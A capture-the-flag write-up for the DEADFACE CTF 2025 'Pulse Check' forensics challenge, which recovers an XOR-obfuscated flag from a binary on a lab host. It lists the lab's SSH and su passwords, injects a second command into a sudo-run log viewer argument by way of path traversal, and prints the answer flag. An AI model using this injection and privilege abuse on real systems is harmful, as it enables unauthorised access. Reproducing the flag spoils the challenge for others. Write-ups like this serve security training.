# Pulse Check - DEADFACE CTF 2025
**Category:** `FORENSICS` `LINUX`
## Challenge Description
<img src="images/Pulse_check.png" alt="Read_em_and_weap" width="250"/>

> What is this machine doing? Our team has looked in various files and we can’t seem to locate the 7th flag. Maybe we need to characterize this host more. 
>>Submit the flag as deadface{flag_text}.
## Discovery
1. SSH into the host:
   ```bash
   ssh gh0st404@hostbusters.deadface.io
   # password: ReadySetG0!
   ```
2. From `~`, reuse the previous escalation path to access the `deephax` console:
   ```bash
   cat ~/.dont_forget
   su deephax          # password: Fr4gm3ntedSkull!!
   (deephax)> quit     # drop into Python shell
   ```

## Extract `dfcheckalive`
3. Use `logviewer` (running as mirveal) to copy and exfiltrate `/usr/bin/dfcheckalive`:
   ```python
   >>> os.system("sudo -u mirveal /usr/bin/logviewer '../../usr/bin/dfcheckalive; base64 /usr/bin/dfcheckalive; #'")
   ```
   - The command leverages directory traversal to access `/usr/bin/dfcheckalive` and appends a `base64` dump of the binary.
   - Redirect output locally (e.g., `> /tmp/df_hostbusters.txt`).

4. Convert the collected Base64 rows back into a binary:
   ```python
   import base64, re
   with open('/tmp/df_hostbusters.txt','r',errors='ignore') as f, open('/tmp/df_hostbusters.bin','wb') as out:
       for line in f:
           line = line.strip()
           if re.fullmatch(r'[A-Za-z0-9+/=]+', line):
               out.write(base64.b64decode(line))
   ```

## Recover Embedded Flag
5. Inspect `.rodata` to locate key/flag bytes (offsets vary but here key starts `0x2000`, ciphertext at `0x2020`):
   ```python
   from pathlib import Path
   data = Path('/tmp/df_hostbusters.bin').read_bytes()
   key = data[0x2000:0x2008]
   enc = data[0x2020:0x2020+0x27]
   flag = bytes(x ^ key[i % len(key)] for i, x in enumerate(enc))
   print(flag.decode())
   ```
   Output:
   ```
   deadface{hostbusters7_d8c0a4c4e64a5b78}
   ```

## Summary
An “alive” reporter binary contained an XOR-obfuscated flag. By copying the binary via the `logviewer` abuse, decoding it locally, and XORing the embedded encrypted blob against the repeating key material, the Hostbusters7 flag was recovered.
